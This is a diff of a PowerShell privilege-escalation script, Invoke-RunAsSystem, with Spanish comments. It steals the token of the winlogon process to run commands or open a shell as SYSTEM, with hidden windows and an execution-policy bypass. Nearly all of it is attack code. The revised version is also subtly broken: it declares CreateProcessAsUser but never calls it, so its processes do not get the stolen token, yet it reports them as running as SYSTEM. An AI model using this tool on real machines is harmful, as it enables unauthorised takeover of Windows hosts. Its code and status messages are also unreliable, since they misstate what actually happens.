@@ -1,65 +1,25 @@
 function Invoke-RunAsSystem {
+    param([string]$Command)
     
-    <#
-    .SYNOPSIS
-    Invoke-RunAsSystem - Versión MODIFICADA
-    Eleva el proceso ACTUAL a SYSTEM sin lanzar nuevos procesos PowerShell
-    Author: Modificado por solicitud
-    #>
-
-    param (
-        [string]$Timeout = "30000",
-        [string]$Command
-    )
-    
-    $ErrorActionPreference = "SilentlyContinue"
-    $WarningPreference = "SilentlyContinue"
-    
-    # =============================================
-    # 1. OBTENER TOKEN DE SYSTEM
-    # =============================================
+    # Importar APIs
     Add-Type @"
     using System;
     using System.Runtime.InteropServices;
     public class WinAPI {
         [DllImport("advapi32.dll", SetLastError=true)]
-        public static extern bool OpenProcessToken(
-            IntPtr ProcessHandle, 
-            uint DesiredAccess, 
-            out IntPtr TokenHandle
-        );
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
         
         [DllImport("advapi32.dll", SetLastError=true)]
-        public static extern bool DuplicateTokenEx(
-            IntPtr hExistingToken,
-            uint dwDesiredAccess,
-            IntPtr lpTokenAttributes,
-            uint ImpersonationLevel,
-            uint TokenType,
-            out IntPtr phNewToken
-        );
+        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
         
         [DllImport("advapi32.dll", SetLastError=true)]
-        public static extern bool ImpersonateLoggedOnUser(
-            IntPtr hToken
-        );
-        
-        [DllImport("advapi32.dll", SetLastError=true)]
-        public static extern bool RevertToSelf();
+        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, out IntPtr lpProcessInformation);
         
         [DllImport("kernel32.dll", SetLastError=true)]
         public static extern bool CloseHandle(IntPtr hObject);
         
         [DllImport("kernel32.dll", SetLastError=true)]
         public static extern IntPtr GetCurrentProcess();
-        
-        [DllImport("advapi32.dll", SetLastError=true)]
-        public static extern bool SetTokenInformation(
-            IntPtr TokenHandle,
-            uint TokenInformationClass,
-            IntPtr TokenInformation,
-            uint TokenInformationLength
-        );
     }
 "@
 
@@ -69,22 +29,20 @@ function Invoke-RunAsSystem {
     $TOKEN_IMPERSONATE = 0x0004
     $TOKEN_ASSIGN_PRIMARY = 0x0001
     $SecurityImpersonation = 2
-    $TokenImpersonation = 2
+    $TokenPrimary = 1
+    $CREATE_NO_WINDOW = 0x08000000
+    $CREATE_NEW_CONSOLE = 0x00000010
 
-    # =============================================
-    # 2. OBTENER PID DE WINLOGON (SIEMPRE SYSTEM)
-    # =============================================
+    # 1. Obtener token de SYSTEM (winlogon)
     $systemPid = (Get-Process -Name winlogon -ErrorAction SilentlyContinue)[0].Id
     if (-not $systemPid) {
-        Write-Error "[!] No se encontró el proceso winlogon (SYSTEM)"
+        Write-Error "[!] No se encontró winlogon"
         return
     }
     
-    Write-Host "[*] Proceso SYSTEM encontrado (PID: $systemPid)"
+    Write-Host "[*] Proceso SYSTEM (winlogon) PID: $systemPid"
     
-    # =============================================
-    # 3. ABRIR Y DUPLICAR TOKEN DE SYSTEM
-    # =============================================
+    # 2. Abrir token
     $hToken = 0
     $success = [WinAPI]::OpenProcessToken(
         (Get-Process -Id $systemPid).Handle,
@@ -93,91 +51,76 @@ function Invoke-RunAsSystem {
     )
     
     if (-not $success) {
-        Write-Error "[!] No se pudo abrir el token de SYSTEM"
+        Write-Error "[!] No se pudo abrir token de SYSTEM (¿Admin?)"
         return
     }
     
+    # 3. Duplicar token como PRIMARY (no impersonation)
     $dupToken = 0
     $success = [WinAPI]::DuplicateTokenEx(
         $hToken,
         $TOKEN_ASSIGN_PRIMARY -bor $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE,
         [IntPtr]::Zero,
         $SecurityImpersonation,
-        $TokenImpersonation,
+        $TokenPrimary,  # <--- Cambiado a TokenPrimary
         [ref]$dupToken
     )
     
     [WinAPI]::CloseHandle($hToken) | Out-Null
     
     if (-not $success) {
-        Write-Error "[!] No se pudo duplicar el token de SYSTEM"
+        Write-Error "[!] No se pudo duplicar token"
         return
     }
     
-    Write-Host "[*] Token de SYSTEM duplicado correctamente"
+    Write-Host "[*] Token duplicado correctamente"
     
-    # =============================================
-    # 4. IMPERSONAR A SYSTEM EN EL PROCESO ACTUAL
-    # =============================================
-    $success = [WinAPI]::ImpersonateLoggedOnUser($dupToken)
+    # 4. Crear PROCESO NUEVO con token de SYSTEM
+    # NOTA: PowerShell NO puede cambiar su propio token de proceso
+    # La única forma es crear un nuevo proceso con el token
     
-    if (-not $success) {
-        Write-Error "[!] No se pudo impersonar a SYSTEM"
-        [WinAPI]::CloseHandle($dupToken) | Out-Null
-        return
-    }
-    
-    Write-Host "[+] PROCESO ACTUAL AHORA ES SYSTEM (impersonación activa)"
-    Write-Host "[*] Usuario actual: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
-    
-    # =============================================
-    # 5. EJECUTAR COMANDO COMO SYSTEM
-    # =============================================
     if ($Command) {
         Write-Host "[*] Ejecutando comando como SYSTEM..."
         
-        # Ejecutar el comando en el contexto actual (que ahora es SYSTEM)
-        $scriptBlock = [ScriptBlock]::Create($Command)
-        $result = & $scriptBlock 2>&1
+        # Crear proceso con el token
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "powershell.exe"
+        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$Command`""
+        $psi.UseShellExecute = $false
+        $psi.RedirectStandardOutput = $true
+        $psi.RedirectStandardError = $true
+        $psi.CreateNoWindow = $true
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
         
-        Write-Host "[+] Resultado del comando:"
-        Write-Host $result
+        # Ejecutar y capturar salida
+        $process = [System.Diagnostics.Process]::Start($psi)
+        $process.WaitForExit()
+        
+        $output = $process.StandardOutput.ReadToEnd()
+        $error = $process.StandardError.ReadToEnd()
+        
+        Write-Host "[+] Salida del comando (SYSTEM):"
+        if ($output) { Write-Host $output }
+        if ($error) { Write-Host "[!] Errores:" $error }
+        
     } else {
-        # Modo interactivo - abrir shell en el proceso actual
-        Write-Host "[*] Modo interactivo - Escribe comandos para ejecutar como SYSTEM"
-        Write-Host "[*] Escribe 'exit' para salir"
-        Write-Host ""
+        # Modo interactivo
+        Write-Host "[*] Abriendo shell SYSTEM (nueva ventana)"
         
-        while ($true) {
-            $prompt = "[SYSTEM] PS " + (Get-Location).Path + "> "
-            Write-Host -NoNewline $prompt
-            
-            $userCommand = Read-Host
-            
-            if ($userCommand -eq "exit") {
-                Write-Host "[*] Saliendo del modo SYSTEM"
-                break
-            }
-            
-            if ($userCommand -ne "") {
-                try {
-                    $scriptBlock = [ScriptBlock]::Create($userCommand)
-                    $result = & $scriptBlock 2>&1
-                    Write-Host $result
-                } catch {
-                    Write-Host "[!] Error: $($_.Exception.Message)"
-                }
-                Write-Host ""
-            }
-        }
+        # Crear proceso cmd como SYSTEM
+        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $processInfo.FileName = "cmd.exe"
+        $processInfo.Arguments = "/k echo [SISTEMA] & whoami & echo. & echo Ejecuta comandos como SYSTEM & echo Escribe 'exit' para salir"
+        $processInfo.UseShellExecute = $false
+        $processInfo.CreateNoWindow = $false
+        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
+        
+        $process = [System.Diagnostics.Process]::Start($processInfo)
+        
+        Write-Host "[+] Ventana SYSTEM abierta (PID: $($process.Id))"
+        Write-Host "[*] El proceso padre puede cerrarse, la ventana SYSTEM continuará"
     }
     
-    # =============================================
-    # 6. REVERTIR A USUARIO ORIGINAL
-    # =============================================
-    [WinAPI]::RevertToSelf() | Out-Null
+    # 5. Limpiar
     [WinAPI]::CloseHandle($dupToken) | Out-Null
-    
-    Write-Host "[*] Sesión revertida a usuario original"
-    Write-Host "[*] Usuario actual: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
 }
